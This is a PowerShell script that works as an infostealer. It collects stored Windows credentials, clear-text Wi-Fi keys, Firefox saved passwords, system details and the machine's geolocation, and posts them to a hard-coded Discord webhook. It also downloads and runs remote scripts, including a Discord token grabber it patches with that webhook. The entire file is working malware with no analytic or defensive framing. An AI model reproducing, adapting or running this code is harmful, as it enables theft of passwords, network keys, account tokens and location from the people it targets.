try {
    Import-Module -Name CredentialManager
}catch {
    Write-Host "Missing Module..."
}


$webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"


function IsInstalled($appName){
    $AppToCheck = '`'+$appName+'*'
    $check = Get-Package | Where-Object -Property Name -like $AppToCheck

    if ($check){
        return $True
    }else {
        return $False
    }
}


function getlc {
    Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
    $GeoWatcher.Start() #Begin resolving current locaton

    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Start-Sleep -Milliseconds 100 #Wait for discovery.
    }  

    if ($GeoWatcher.Permission -eq 'Denied'){ # If Access Dineid
        Write-Host "Access Denied for Location Information" -ForegroundColor "red"
    } else {
        return $GeoWatcher.Position.Location | Select-Object Latitude,Longitude #Select the relevent results.
    }
}


function Get-FireFoxCred {
    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/Find-FirefoxFiles.ps1" -OutFile "$env:USERPROFILE\firefoxer01.ps1"
    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/ConvertFrom-NSS.ps1" -OutFile "$env:USERPROFILE\firefoxer02.ps1"
    Invoke-WebRequest "https://raw.githubusercontent.com/techchrism/firefox-password-decrypt/master/Get-FirefoxPasswords.ps1" -OutFile "$env:USERPROFILE\firefoxer03.ps1"

    Set-Location $env:USERPROFILE

    . .\firefoxer01.ps1
    . .\firefoxer02.ps1
    . .\firefoxer03.ps1

    $FireFoxCred = Get-FirefoxPasswords | Select-Object username, password, hostname

    Remove-Item firefoxer01.ps1
    Remove-Item firefoxer02.ps1
    Remove-Item firefoxer03.ps1

    return $FireFoxCred
}


# Get Windows Credentials
$WCred = @()
foreach ($i in Get-StoredCredential){
    $username = $i.UserName
    $Password = $i.GetNetworkCredential().password
    $WCred += New-Object -TypeName psobject -Property @{Username=$username; Password=$Password}
}




# Get WLAN Keys
$WLAN_Keys = @()
foreach ($profile in ((netsh.exe wlan show profiles) -match '\s{2,}:\s') -replace '.*:\s' , ''){

    $ProfileInfo = netsh wlan show profile $profile key=clear

    if ($ProfileInfo -match 'Key Content'){

        $Key = $ProfileInfo -match 'Key Content'
        $FormattedKey = $key.substring(29)

        #Write-Host "WIFI : $profile`nKey : $FormattedKey"
        $WLAN_Keys += New-Object -TypeName psobject -Property @{Wlan=$profile; Key=$FormattedKey}
    } 
}


# Send Windows Infos
$Body = @{
    'username' = 'Evil Daru'
    'content' = ":computer:  **Computer Infos**``````"
}

# Getting Computer Informations
$WinInfos = Get-ComputerInfo
$username = $WinInfos.CsUserName
$domain = $WinInfos.CsDomain
$hostname = $WinInfos.CsDNSHostName
$OsName = $WinInfos.OsName
$OsVersion = $WinInfos.OSDisplayVersion
$model = $WinInfos.CsModel
$manufacturer = $WinInfos.CsManufacturer
$Body.content += "Username     : $username`n"
$Body.content += "Domain       : $domain`n"
$Body.content += "Hostname     : $hostname`n"
$Body.content += "Os Name      : $OsName`n"
$Body.content += "Os Version   : $OsVersion`n"
$Body.content += "Model        : $model`n"
$Body.content += "Manufacturer : $manufacturer"


# Getting Windows Credentials
$Body.content += "```````n:lock:  **Windows Credentials**``````"
foreach ($cred in $WCred) {
    $Username = $cred.Username
    $Password = $cred.Password
    $Body.content += "$Username"+":"+"$Password`n"
}



# Getting FireFox Credentials
if (IsInstalled -appName "Mozilla"){
    $Body.content += "```````n:fox:  **FireFox Credentials**``````"
    $FCreds = Get-FireFoxCred
    foreach ($cred in $FCreds){
        $username = $cred.username
        $password = $cred.password
        $url = $cred.hostname
        $Body.content += "$username"+":"+"$password"+" ($url)`n"
    }
}


# Getting WLAN Keys
$Body.content += "```````n:key:  **WLAN Keys**``````"
foreach ($wlan in $WLAN_Keys){
    $WlanName = $wlan.Wlan
    $WlanKey = $wlan.Key
    $Body.content += "$WlanName"+":"+"$WlanKey`n"
}

# Getting Location
$location = getlc
$Latitude = $location.Latitude
$Longitude = $location.Longitude
$Body.content += "```````n:earth_americas:  **Location**``````"
$Body.content += "Latitude  : $Latitude`n"
$Body.content += "Longitude : $Longitude``````"
$Body.content += "https://www.google.com/maps/place/$Latitude,$Longitude`n"


# Send body through WebHook
Invoke-RestMethod -Uri $webHookUrl -Method 'post' -Body $Body





# Check if Discord is installed, if yes, token grab
if (IsInstalled -appName "Discord"){
    if (IsInstalled -appName "Python 3"){
        $fileName = "$env:USERPROFILE\setup.py"
        Invoke-WebRequest "https://raw.githubusercontent.com/wodxgod/Discord-Token-Grabber/master/token-grabber.py" -outfile $fileName
        (Get-Content $fileName) -replace "WEBHOOK_URL = 'WEBHOOK HERE'", "WEBHOOK_URL = '$webHookUrl'" | Set-Content $fileName
        python $filename

        Remove-Item $filename
    }
}
